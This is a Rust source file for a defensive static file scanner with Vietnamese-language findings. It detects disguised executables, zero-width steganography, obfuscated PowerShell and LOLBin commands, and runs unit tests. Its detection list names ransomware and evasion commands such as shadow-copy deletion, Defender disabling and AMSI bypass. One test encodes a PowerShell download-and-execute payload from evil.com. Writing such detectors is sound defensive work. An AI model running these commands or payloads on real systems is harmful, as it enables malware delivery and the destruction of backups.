use md5::Digest as _;
use serde::{Deserialize, Serialize};
use std::ffi::c_void;
use std::fs::File;
use std::io::Read;
use std::path::Path;

#[cfg(windows)]
#[repr(C)]
struct OpenFileNameW {
    l_struct_size: u32,
    hwnd_owner: *mut c_void,
    instance: *mut c_void,
    filter: *const u16,
    custom_filter: *mut u16,
    max_cust_filter: u32,
    filter_index: u32,
    file: *mut u16,
    max_file: u32,
    file_title: *mut u16,
    max_file_title: u32,
    initial_dir: *const u16,
    title: *const u16,
    flags: u32,
    file_offset: u16,
    file_extension: u16,
    def_ext: *const u16,
    cust_data: usize,
    fn_hook: *mut c_void,
    template_name: *const u16,
    pv_reserved: *mut c_void,
    dw_reserved: u32,
    flags_ex: u32,
}

#[cfg(windows)]
#[link(name = "comdlg32", kind = "raw-dylib", modifiers = "+verbatim")]
unsafe extern "system" {
    fn GetOpenFileNameW(lpofn: *mut OpenFileNameW) -> i32;
}

/// Open the native file picker. `owner_hwnd` should be the HWND of the main
/// window; with a null owner the dialog can appear BEHIND the app. The call
/// runs its own modal Win32 message loop, so invoke it from the event-loop
/// thread — the UI keeps repainting while it is open.
#[cfg(windows)]
pub fn pick_file_dialog(owner_hwnd: *mut c_void) -> Option<String> {
    let mut file_buf = vec![0u16; 1024];
    let title: Vec<u16> = "Chọn tệp cần quét bảo mật (Select File to Scan)\0"
        .encode_utf16()
        .collect();
    let filter: Vec<u16> = "All Files (*.*)\0*.*\0Trace Files (*.tmf;*.log;*.etl;*.evtx)\0*.tmf;*.log;*.etl;*.evtx\0Scripts & Executables (*.exe;*.dll;*.bat;*.cmd;*.ps1;*.vbs;*.js)\0*.exe;*.dll;*.bat;*.cmd;*.ps1;*.vbs;*.js\0Documents & Text (*.txt;*.pdf;*.doc;*.docx;*.rtf;*.log)\0*.txt;*.pdf;*.doc;*.docx;*.rtf;*.log\0\0"
        .encode_utf16()
        .collect();

    let mut ofn = OpenFileNameW {
        l_struct_size: std::mem::size_of::<OpenFileNameW>() as u32,
        hwnd_owner: owner_hwnd,
        instance: std::ptr::null_mut(),
        filter: filter.as_ptr(),
        custom_filter: std::ptr::null_mut(),
        max_cust_filter: 0,
        filter_index: 1,
        file: file_buf.as_mut_ptr(),
        max_file: file_buf.len() as u32,
        file_title: std::ptr::null_mut(),
        max_file_title: 0,
        initial_dir: std::ptr::null(),
        title: title.as_ptr(),
        flags: 0x00000800 | 0x00001000 | 0x00080000,
        file_offset: 0,
        file_extension: 0,
        def_ext: std::ptr::null(),
        cust_data: 0,
        fn_hook: std::ptr::null_mut(),
        template_name: std::ptr::null(),
        pv_reserved: std::ptr::null_mut(),
        dw_reserved: 0,
        flags_ex: 0,
    };

    let ok = unsafe { GetOpenFileNameW(&mut ofn) };
    if ok != 0 {
        let end = file_buf
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(file_buf.len());
        Some(String::from_utf16_lossy(&file_buf[..end]))
    } else {
        None
    }
}

#[cfg(not(windows))]
pub fn pick_file_dialog(owner_hwnd: *mut c_void) -> Option<String> {
    let _ = owner_hwnd;
    None
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileFinding {
    pub severity: String,
    pub category: String,
    pub description: String,
    pub snippet: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileScanReport {
    pub file_path: String,
    pub file_name: String,
    pub file_size_bytes: u64,
    pub md5: String,
    pub sha1: String,
    pub sha256: String,
    pub entropy: f64,
    pub risk_score: i32,
    pub risk_level: String,
    pub is_pe: bool,
    pub is_packed: bool,
    pub findings: Vec<FileFinding>,
    pub summary_text: String,
}

pub fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

fn safe_char_boundary_slice(s: &str, byte_idx: usize, pattern_len: usize) -> String {
    let mut start = byte_idx.saturating_sub(20);
    while start > 0 && !s.is_char_boundary(start) {
        start -= 1;
    }
    let mut end = (byte_idx + pattern_len + 30).min(s.len());
    while end < s.len() && !s.is_char_boundary(end) {
        end += 1;
    }
    s[start..end].replace('\n', " ").replace('\r', "")
}

pub fn scan_file<P: AsRef<Path>>(path: P) -> Result<FileScanReport, String> {
    let p = path.as_ref();
    if !p.exists() {
        return Err("File does not exist".to_string());
    }
    let metadata = p
        .metadata()
        .map_err(|e| format!("Cannot read file metadata: {e}"))?;
    if !metadata.is_file() {
        return Err("Path is not a regular file".to_string());
    }

    let file_size_bytes = metadata.len();
    let file_name = p
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();

    let mut file = File::open(p).map_err(|e| format!("Cannot open file for reading: {e}"))?;
    // Static-analysis window capped at 16 MB: entropy/PE/text heuristics are
    // fully effective on the first megabytes, while a 64 MB window could spike
    // the working set ~190 MB (buffer + lossy + lowercase copies). Hashes below
    // still stream over the ENTIRE file, so integrity output is unaffected.
    let max_read = (file_size_bytes as usize).min(16 * 1024 * 1024);
    let mut buffer = vec![0u8; max_read];
    file.read_exact(&mut buffer)
        .map_err(|e| format!("Cannot read file bytes: {e}"))?;

    let mut md5_h = md5::Md5::new();
    let mut sha1_h = sha1::Sha1::new();
    let mut sha256_h = sha2::Sha256::new();
    md5_h.update(&buffer);
    sha1_h.update(&buffer);
    sha256_h.update(&buffer);

    if file_size_bytes > max_read as u64 {
        let mut stream_chunk = [0u8; 65536];
        loop {
            match file.read(&mut stream_chunk) {
                Ok(0) => break,
                Ok(n) => {
                    md5_h.update(&stream_chunk[..n]);
                    sha1_h.update(&stream_chunk[..n]);
                    sha256_h.update(&stream_chunk[..n]);
                }
                Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(e) => return Err(format!("Cannot read file bytes: {e}")),
            }
        }
    }

    let md5_str = format!("{:x}", md5_h.finalize());
    let sha1_str = format!("{:x}", sha1_h.finalize());
    let sha256_str = format!("{:x}", sha256_h.finalize());

    let entropy = calculate_entropy(&buffer);
    let is_packed = entropy >= 7.2;

    let is_pe = buffer.starts_with(b"MZ");
    let ext = p
        .extension()
        .map(|e| e.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();

    let mut findings = Vec::new();
    let mut risk_score: i32 = 0;

    if file_name.contains('\u{202E}') {
        risk_score += 45;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "RTLO Extension Spoofing".to_string(),
            description: "Ký tự Unicode RTLO (\\u202E) đảo ngược hiển thị phần mở rộng tệp."
                .to_string(),
            snippet: file_name.clone(),
        });
    }

    let non_exe_exts = [
        "txt", "jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "xls", "xlsx", "mp4", "mp3",
        "csv", "log", "ini", "json", "xml", "html", "css", "tmf", "etl", "evtx",
    ];
    if is_pe && non_exe_exts.contains(&ext.as_str()) {
        risk_score += 55;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Disguised Executable".to_string(),
            description: format!(
                "Tệp thực thi Windows (PE/MZ) nguỵ trang nguy hiểm dưới phần mở rộng .{ext}!"
            ),
            snippet: format!("Extension: .{ext} | Header: MZ (0x4D5A)"),
        });
    }

    if is_packed {
        risk_score += 25;
        findings.push(FileFinding {
            severity: "MEDIUM".to_string(),
            category: "High Entropy (Packing/Encryption)".to_string(),
            description: format!(
                "Độ hỗn loạn Entropy cao ({:.2}/8.0), dấu hiệu của trình nén mã (packer) hoặc mã độc bị mã hoá.",
                entropy
            ),
            snippet: format!("Entropy: {:.3}", entropy),
        });
    }

    let text_content = String::from_utf8_lossy(&buffer);

    let zw_chars = [
        '\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}', '\u{2060}', '\u{200E}', '\u{200F}',
    ];
    let zw_count: usize = text_content
        .chars()
        .filter(|c| zw_chars.contains(c))
        .count();
    if zw_count >= 8 {
        risk_score += 35;
        findings.push(FileFinding {
            severity: "HIGH".to_string(),
            category: "Hidden Steganography".to_string(),
            description: format!(
                "Phát hiện {zw_count} ký tự Unicode vô hình (Zero-Width) nghi vấn che giấu dữ liệu mật hoặc shellcode."
            ),
            snippet: format!("Zero-width characters count: {zw_count}"),
        });
    }

    let lower_text = text_content.to_ascii_lowercase();
    let trimmed_lower = lower_text.trim_start();
    let greetings = [
        "xin chào",
        "xin chao",
        "hello",
        "hi ",
        "greetings",
        "你好",
        "您好",
        "привет",
        "здравствуйте",
        "halo",
        "hola",
        "dear friend",
    ];
    let starts_with_greeting = {
        // Full Unicode lowercase so non-ASCII greetings ("Привет",
        // "Здравствуйте") still match — to_ascii_lowercase leaves Cyrillic.
        let greeting_text = text_content.to_lowercase();
        let greeting_trimmed = greeting_text.trim_start();
        greetings.iter().any(|&g| greeting_trimmed.starts_with(g))
    };

    let suspicious_commands = [
        (
            "set-mppreference -disablerealtimemonitoring",
            "CRITICAL",
            50,
            "Tắt tính năng bảo vệ Windows Defender theo thời gian thực",
        ),
        (
            "vssadmin delete shadows",
            "CRITICAL",
            50,
            "Xoá điểm phục hồi Volume Shadow Copies (dấu hiệu Ransomware)",
        ),
        (
            "wbadmin delete catalog",
            "CRITICAL",
            50,
            "Xoá nhật ký sao lưu hệ thống (Ransomware evasion)",
        ),
        (
            "bcdedit /set {default} recoveryenabled no",
            "CRITICAL",
            45,
            "Vô hiệu hóa tính năng phục hồi tự động của Windows",
        ),
        (
            "amsiutils",
            "CRITICAL",
            45,
            "Kỹ thuật can thiệp Antimalware Scan Interface (AMSI Bypass)",
        ),
        (
            "amsiinitfailed",
            "CRITICAL",
            45,
            "Kỹ thuật vô hiệu hóa kiểm tra AMSI Init",
        ),
        (
            "minidumpwritedump",
            "HIGH",
            40,
            "Khai thác trích xuất bộ nhớ tiến trình (Credential Dumping / LSASS)",
        ),
        (
            "-encodedcommand",
            "HIGH",
            35,
            "Lệnh PowerShell mã hoá Base64 (-EncodedCommand)",
        ),
        (
            "-enc ",
            "HIGH",
            35,
            "Lệnh PowerShell rút gọn mã hoá Base64 (-enc)",
        ),
        (
            "downloadstring",
            "HIGH",
            30,
            "PowerShell tải mã thực thi từ xa qua DownloadString",
        ),
        (
            "downloadfile",
            "HIGH",
            30,
            "PowerShell tải tệp thực thi qua DownloadFile",
        ),
        (
            "invoke-expression",
            "HIGH",
            25,
            "Thực thi chuỗi động nguy hiểm (Invoke-Expression)",
        ),
        (
            "| iex",
            "HIGH",
            25,
            "Thực thi chuỗi động qua pipeline (| iex)",
        ),
        (
            "|iex",
            "HIGH",
            25,
            "Thực thi chuỗi động qua pipeline (|iex)",
        ),
        (
            "certutil -urlcache",
            "HIGH",
            25,
            "LOLBin certutil tải tệp lạ từ Internet (-urlcache)",
        ),
        (
            "certutil -decode",
            "HIGH",
            25,
            "LOLBin certutil giải mã tệp độc hại (-decode)",
        ),
        (
            "bitsadmin /transfer",
            "HIGH",
            25,
            "LOLBin bitsadmin tải tệp chạy ngầm (/transfer)",
        ),
        (
            "regsvr32 /s /u",
            "HIGH",
            25,
            "LOLBin regsvr32 thực thi DLL không giám sát",
        ),
        (
            "rundll32.exe",
            "HIGH",
            20,
            "LOLBin rundll32 thực thi thư viện động",
        ),
        (
            "mshta.exe",
            "HIGH",
            25,
            "LOLBin mshta thực thi HTML Application",
        ),
    ];

    let mut found_command_count = 0;
    for &(cmd, sev, risk_inc, desc) in &suspicious_commands {
        if lower_text.contains(cmd) {
            found_command_count += 1;
            risk_score += risk_inc;
            let idx = lower_text.find(cmd).unwrap_or(0);
            let snippet = safe_char_boundary_slice(&text_content, idx, cmd.len());
            findings.push(FileFinding {
                severity: sev.to_string(),
                category: "Malicious Command Pattern".to_string(),
                description: desc.to_string(),
                snippet,
            });
        }
    }

    if starts_with_greeting && (found_command_count > 0 || is_pe || zw_count >= 8) {
        risk_score += 45;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Deceptive Greeting Wrapper".to_string(),
            description: "Tệp mở đầu bằng lời chào ngây thơ (\"Xin chào / Hello / 你好 / Привет\"), nhưng thực tế nguỵ trang cho lệnh thực thi độc hại hoặc payload ẩn!".to_string(),
            snippet: trimmed_lower.chars().take(60).collect(),
        });
    }

    if ext == "tmf" {
        scan_tmf_file(&text_content, &mut findings, &mut risk_score);
    }

    scan_hidden_deceptive_code(&text_content, &mut findings, &mut risk_score);

    scan_embedded_base64(&text_content, &mut findings, &mut risk_score);

    risk_score = risk_score.clamp(0, 100);

    let risk_level = if risk_score >= 60 {
        "MALICIOUS"
    } else if risk_score >= 25 {
        "SUSPICIOUS"
    } else {
        "SAFE"
    };

    let greeting_prefix = "👋 Hello! ";
    let summary_text = match risk_level {
        "MALICIOUS" => format!(
            "{}CẢNH BÁO NGUY HIỂM: Tệp chứa {} dấu hiệu mã độc nguy cơ cao (Điểm rủi ro: {}/100).",
            greeting_prefix,
            findings.len(),
            risk_score
        ),
        "SUSPICIOUS" => format!(
            "{}CHÚ Ý: Phát hiện {} điểm bất thường nghi vấn cần kiểm tra kỹ (Điểm rủi ro: {}/100).",
            greeting_prefix,
            findings.len(),
            risk_score
        ),
        _ => format!(
            "{}AN TOÀN: Không phát hiện mã độc hoặc cấu trúc đáng ngờ (Điểm rủi ro: {}/100).",
            greeting_prefix, risk_score
        ),
    };

    Ok(FileScanReport {
        file_path: p.to_string_lossy().to_string(),
        file_name,
        file_size_bytes,
        md5: md5_str,
        sha1: sha1_str,
        sha256: sha256_str,
        entropy,
        risk_score,
        risk_level: risk_level.to_string(),
        is_pe,
        is_packed,
        findings,
        summary_text,
    })
}

fn scan_tmf_file(text: &str, findings: &mut Vec<FileFinding>, risk_score: &mut i32) {
    let lower = text.to_ascii_lowercase();

    let format_string_attacks = [
        ("%n", "Khai thác lỗ hổng ghi nhớ format string (%n) có thể làm tràn hoặc chiếm quyền điều khiển"),
        ("%p%p%p%p", "Dãy token dereference con trỏ (%p) dùng để rò rỉ địa chỉ bộ nhớ (Memory Leak)"),
        ("%x%x%x%x%x", "Dãy token đọc bộ nhớ ngăn xếp stack leak"),
    ];
    for (pat, desc) in &format_string_attacks {
        if lower.contains(pat) {
            *risk_score += 35;
            findings.push(FileFinding {
                severity: "HIGH".to_string(),
                category: "TMF Format String Exploit Token".to_string(),
                description: desc.to_string(),
                snippet: pat.to_string(),
            });
        }
    }

    let injected_commands = [
        (
            "powershell",
            "Lệnh PowerShell nhúng trong tệp định dạng dấu vết TMF",
        ),
        ("cmd.exe", "Lệnh Command Prompt nhúng trong TMF"),
        (
            "downloadstring",
            "PowerShell WebClient payload nhúng trong TMF",
        ),
        ("iex", "Lệnh thực thi chuỗi động (IEX) nhúng trong TMF"),
        ("mshta", "Lệnh MSHTA HTML Application nhúng trong TMF"),
        ("cscript", "Script engine cscript nhúng trong TMF"),
        ("wscript", "Script engine wscript nhúng trong TMF"),
        ("certutil", "LOLBin certutil nhúng trong TMF"),
        ("bitsadmin", "LOLBin bitsadmin nhúng trong TMF"),
        ("rundll32", "Thực thi DLL rundll32 nhúng trong TMF"),
    ];
    for (pat, desc) in &injected_commands {
        if lower.contains(pat) {
            *risk_score += 45;
            findings.push(FileFinding {
                severity: "CRITICAL".to_string(),
                category: "Injected Code in TMF Trace Format".to_string(),
                description: format!("Phát hiện mã độc tiêm vào tệp TMF: {desc}"),
                snippet: pat.to_string(),
            });
        }
    }

    if lower.contains("\\x90\\x90\\x90")
        || lower.contains("0x90,0x90,0x90")
        || lower.contains("0x90, 0x90, 0x90")
    {
        *risk_score += 50;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Embedded Shellcode NOP Sled in TMF".to_string(),
            description: "Dãy mã máy NOP sled (0x90) thường dùng trong khai thác bộ nhớ / shellcode nhúng trong tệp TMF!".to_string(),
            snippet: "NOP sled sequence detected".to_string(),
        });
    }
}

fn scan_hidden_deceptive_code(text: &str, findings: &mut Vec<FileFinding>, risk_score: &mut i32) {
    let lower = text.to_ascii_lowercase();

    if lower.contains('`') {
        let debacktick = lower.replace('`', "");
        let suspicious = [
            "powershell",
            "downloadstring",
            "invoke-expression",
            "iex",
            "system.net.webclient",
            "bypass",
        ];
        for s in &suspicious {
            // Emit backtick-obfuscation finding even when the plain keyword is
            // also present elsewhere — both the plain command and the obfuscated
            // variant are reported.
            if debacktick.contains(s) {
                *risk_score += 40;
                findings.push(FileFinding {
                    severity: "HIGH".to_string(),
                    category: "Backtick Obfuscation Evasion".to_string(),
                    description: format!("Kỹ thuật chèn dấu phẩy ngược (backtick) để che giấu từ khóa nguy hiểm '{s}'."),
                    snippet: format!("De-obfuscated: {s}"),
                });
                break;
            }
        }
    }

    if lower.contains('^') {
        let decaret = lower.replace('^', "");
        let suspicious = [
            "powershell",
            "cmd.exe",
            "downloadstring",
            "invoke-expression",
            "vssadmin",
            "certutil",
        ];
        for s in &suspicious {
            if decaret.contains(s) && !lower.contains(s) {
                *risk_score += 40;
                findings.push(FileFinding {
                    severity: "HIGH".to_string(),
                    category: "Caret Escape Obfuscation".to_string(),
                    description: format!("Kỹ thuật chèn dấu mũ (caret ^) để ngụy trang câu lệnh độc hại '{s}' trong CMD/BAT."),
                    snippet: format!("De-obfuscated: {s}"),
                });
                break;
            }
        }
    }

    if lower.contains("'+'") || lower.contains("\"+\"") {
        let deconcat = lower
            .replace("'+'", "")
            .replace("\"+\"", "")
            .replace("' + '", "")
            .replace("\" + \"", "");
        let suspicious = [
            "downloadstring",
            "invoke-expression",
            "iex",
            "webclient",
            "bypass",
            "hidden",
        ];
        for s in &suspicious {
            if deconcat.contains(s) && !lower.contains(s) {
                *risk_score += 35;
                findings.push(FileFinding {
                    severity: "HIGH".to_string(),
                    category: "String Concatenation Evasion".to_string(),
                    description: format!(
                        "Kỹ thuật ghép chuỗi ký tự rời rạc để trốn tránh phát hiện lệnh '{s}'."
                    ),
                    snippet: format!("De-concatenated: {s}"),
                });
                break;
            }
        }
    }

    if lower.contains("\\x4d\\x5a") || lower.contains("0x4d, 0x5a") || lower.contains("0x4d,0x5a") {
        *risk_score += 55;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Disguised Hex Executable (MZ Header)".to_string(),
            description: "Dữ liệu Hex thô chứa chữ ký PE Executable (MZ - 0x4D 0x5A) ngụy trang dạng chuỗi văn bản!".to_string(),
            snippet: "MZ (0x4D, 0x5A) hex stream found".to_string(),
        });
    }

    let zw_0 = '\u{200B}';
    let zw_1 = '\u{200C}';
    if text.contains(zw_0) && text.contains(zw_1) {
        let mut bits = String::new();
        for c in text.chars() {
            if c == zw_0 {
                bits.push('0');
            } else if c == zw_1 {
                bits.push('1');
            }
        }
        if bits.len() >= 16 {
            let mut decoded_bytes = Vec::new();
            for chunk in bits.as_bytes().chunks(8) {
                if chunk.len() == 8 {
                    if let Ok(byte_str) = std::str::from_utf8(chunk) {
                        if let Ok(b) = u8::from_str_radix(byte_str, 2) {
                            decoded_bytes.push(b);
                        }
                    }
                }
            }
            if !decoded_bytes.is_empty() {
                let decoded_str = String::from_utf8_lossy(&decoded_bytes).to_ascii_lowercase();
                if decoded_str.contains("http")
                    || decoded_str.contains("cmd")
                    || decoded_str.contains("powershell")
                    || decoded_bytes.starts_with(b"MZ")
                {
                    *risk_score += 60;
                    findings.push(FileFinding {
                        severity: "CRITICAL".to_string(),
                        category: "Decoded Zero-Width Steganography Payload".to_string(),
                        description: "Giải mã thành công thông điệp ẩn giấu trong ký tự Zero-Width: Chứa mã độc hoặc URL điều khiển ngầm!".to_string(),
                        snippet: decoded_str.chars().take(60).collect(),
                    });
                }
            }
        }
    }
}

fn scan_embedded_base64(text: &str, findings: &mut Vec<FileFinding>, risk_score: &mut i32) {
    use base64::Engine;
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if is_b64_char(bytes[i]) {
            let start = i;
            while i < bytes.len() && is_b64_char(bytes[i]) {
                i += 1;
            }
            let chunk_len = i - start;
            if chunk_len >= 56 {
                let candidate = &text[start..i];
                if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) {
                    if decoded.starts_with(b"MZ") {
                        *risk_score += 50;
                        findings.push(FileFinding {
                            severity: "CRITICAL".to_string(),
                            category: "Embedded Executable in Base64".to_string(),
                            description: "Khối Base64 giải mã trực tiếp ra tệp thực thi PE Windows (MZ header)!".to_string(),
                            snippet: format!("Base64 chunk ({} chars) -> Decoded PE ({} bytes)", chunk_len, decoded.len()),
                        });
                        break;
                    }
                    let dec_str = String::from_utf8_lossy(&decoded).to_ascii_lowercase();
                    if dec_str.contains("powershell")
                        || dec_str.contains("downloadstring")
                        || dec_str.contains("cmd.exe")
                    {
                        *risk_score += 35;
                        findings.push(FileFinding {
                            severity: "HIGH".to_string(),
                            category: "Encoded Script Payload".to_string(),
                            description: "Khối Base64 giải mã ra lệnh PowerShell / CMD độc hại!"
                                .to_string(),
                            snippet: dec_str.chars().take(80).collect(),
                        });
                        break;
                    }
                }
            }
        } else {
            i += 1;
        }
    }
}

fn is_b64_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'='
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_calculate_entropy() {
        let zeros = vec![0u8; 1000];
        assert_eq!(calculate_entropy(&zeros), 0.0);

        let mut random_like = Vec::with_capacity(256 * 10);
        for i in 0..256 {
            for _ in 0..10 {
                random_like.push(i as u8);
            }
        }
        let e = calculate_entropy(&random_like);
        assert!(e > 7.9);
    }

    #[test]
    fn test_deceptive_greeting_wrapper_detection_cyrillic() {
        // "Привет" with a capital П only matches when the haystack is
        // Unicode-lowercased (to_ascii_lowercase leaves Cyrillic untouched).
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_deceptive_cyrillic.txt");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(
                "Привет, друг! Запусти powershell -enc aG52b2tlLWV4cHJlc3Npb24gKA==\n".as_bytes(),
            )
            .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Deceptive Greeting Wrapper"));
    }

    #[test]
    fn test_deceptive_greeting_wrapper_detection() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_deceptive_malware.txt");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all("Xin chao ban yeu dau! Chuc mot ngay tot lanh.\n\npowershell -enc aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCJodHRwczovL2V2aWwuY29tL3BheWxvYWQucHMxIik=".as_bytes()).unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report.risk_score >= 60);
        assert_eq!(report.risk_level, "MALICIOUS");
        assert!(report.summary_text.starts_with("👋 Hello! "));
        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Deceptive Greeting Wrapper"));
    }

    #[test]
    fn test_disguised_pe_detection() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("fake_invoice.pdf");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(b"MZ\x90\x00\x03\x00\x00\x00This program cannot be run in DOS mode.")
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report.is_pe);
        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Disguised Executable"));
    }

    #[test]
    fn test_tmf_analysis_injected_powershell() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("driver_trace.tmf");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all("// PDB: mydriver.pdb\n#typev Driver_c100 10 \"[Trace] %!FUNC!\" // Injected: powershell downloadstring\n".as_bytes()).unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Injected Code in TMF Trace Format"));
        assert!(report.risk_score >= 45);
    }

    #[test]
    fn test_tmf_disguised_executable() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("fake_trace.tmf");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(b"MZ\x90\x00\x03\x00\x00\x00Fake TMF is actually PE")
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report.is_pe);
        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Disguised Executable"));
    }

    #[test]
    fn test_backtick_obfuscation_detection() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_backtick.ps1");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all("Write-Host 'Test'\n& (p`o`w`e`r`s`h`e`l`l) -w hidden\n".as_bytes())
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Backtick Obfuscation Evasion"));
    }

    #[test]
    fn test_zero_width_steganography_payload() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_stego.txt");
        {
            let mut f = File::create(&file_path).unwrap();

            let mut content = String::from("Normal innocent document text.\n");
            for b in b"http" {
                for i in (0..8).rev() {
                    if (b >> i) & 1 == 1 {
                        content.push('\u{200C}');
                    } else {
                        content.push('\u{200B}');
                    }
                }
            }
            f.write_all(content.as_bytes()).unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Decoded Zero-Width Steganography Payload"));
    }

    #[test]
    fn test_safe_char_boundary_slice_multibyte() {
        let text = "Xin chào 👋 世界 Привет powershell downloadstring kết thúc kiểm tra.";
        let idx = text.find("powershell").unwrap();
        let snippet = safe_char_boundary_slice(text, idx, "powershell".len());
        assert!(snippet.contains("powershell"));
    }
}
